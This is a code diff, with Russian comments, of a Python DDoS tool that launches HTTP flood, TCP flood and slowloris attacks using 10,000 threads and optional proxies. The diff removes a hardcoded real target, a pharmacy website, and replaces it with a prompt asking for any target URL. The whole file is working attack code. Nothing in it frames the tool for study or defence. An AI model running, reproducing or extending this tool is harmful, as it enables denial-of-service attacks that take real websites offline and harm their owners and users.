@@ -1,4 +1,5 @@
 # -*- coding: utf-8 -*-
+
 import socket
 import random
 import threading
@@ -7,7 +8,6 @@ import urllib.request
 from datetime import datetime
 
 # ===== НАСТРОЙКИ ===== #
-TARGET_URL = "https://www.euroapteek.ee"  # 🔧 Замени на цель
 THREADS = 10000                     # 💀 Количество потоков
 ATTACK_DURATION = 300              # ⏱️ Длительность атаки (сек)
 USE_PROXIES = False                # 🌐 Использовать прокси (True/False)
@@ -25,8 +25,24 @@ PROXIES = [
     "45.95.147.106:8080"
 ]
 
+# ===== ФУНКЦИЯ ВВОДА URL ===== #
+def get_target_url():
+    """Запрашивает URL у пользователя и проверяет его."""
+    while True:
+        url = input("Введите URL цели (например, example.com или https://example.com): ").strip()
+        
+        # Автоматическое добавление http://, если нет протокола
+        if not url.startswith(("http://", "https://")):
+            url = "http://" + url
+        
+        # Простая проверка URL (можно заменить на более строгую)
+        if "." in url and len(url) > 10:
+            return url
+        else:
+            print("❌ Некорректный URL! Попробуйте снова.")
+
 # ===== АТАКИ ===== #
-def http_flood():
+def http_flood(TARGET_URL):
     while True:
         try:
             headers = {
@@ -43,7 +59,7 @@ def http_flood():
         except:
             pass
 
-def tcp_flood():
+def tcp_flood(TARGET_URL):
     target_ip = socket.gethostbyname(TARGET_URL.split("//")[-1].split("/")[0])
     target_port = 80
     while True:
@@ -56,7 +72,7 @@ def tcp_flood():
         except:
             pass
 
-def slowloris():
+def slowloris(TARGET_URL):
     target_ip = socket.gethostbyname(TARGET_URL.split("//")[-1].split("/")[0])
     sockets = []
     for _ in range(200):
@@ -77,7 +93,10 @@ def slowloris():
         time.sleep(15)
 
 # ===== ЗАПУСК ===== #
-print(f"""
+if __name__ == "__main__":
+    TARGET_URL = get_target_url()
+    
+    print(f"""
 ▓█████▄  ▒█████   ███▄ ▄███▓ ██▓███   ██▓     ▒█████   ██▀███  
 ▒██▀ ██▌▒██▒  ██▒▓██▒▀█▀ ██▒▓██░  ██▒▓██▒    ▒██▒  ██▒▓██ ▒ ██▒
 ░██   █▌▒██░  ██▒▓██    ▓██░▓██░ ██▓▒▒██░    ▒██░  ██▒▓██ ░▄█ ▒
@@ -93,12 +112,12 @@ Threads: {THREADS}
 Time: {ATTACK_DURATION} sec
 """)
 
-# Запуск атак
-for _ in range(THREADS):
-    threading.Thread(target=http_flood, daemon=True).start()
-    threading.Thread(target=tcp_flood, daemon=True).start()
-    threading.Thread(target=slowloris, daemon=True).start()
+    # Запуск атак
+    for _ in range(THREADS):
+        threading.Thread(target=http_flood, args=(TARGET_URL,), daemon=True).start()
+        threading.Thread(target=tcp_flood, args=(TARGET_URL,), daemon=True).start()
+        threading.Thread(target=slowloris, args=(TARGET_URL,), daemon=True).start()
 
-# Таймер
-time.sleep(ATTACK_DURATION)
-print("\n[!] Attack finished.")
+    # Таймер
+    time.sleep(ATTACK_DURATION)
+    print("\n[!] Attack finished.")
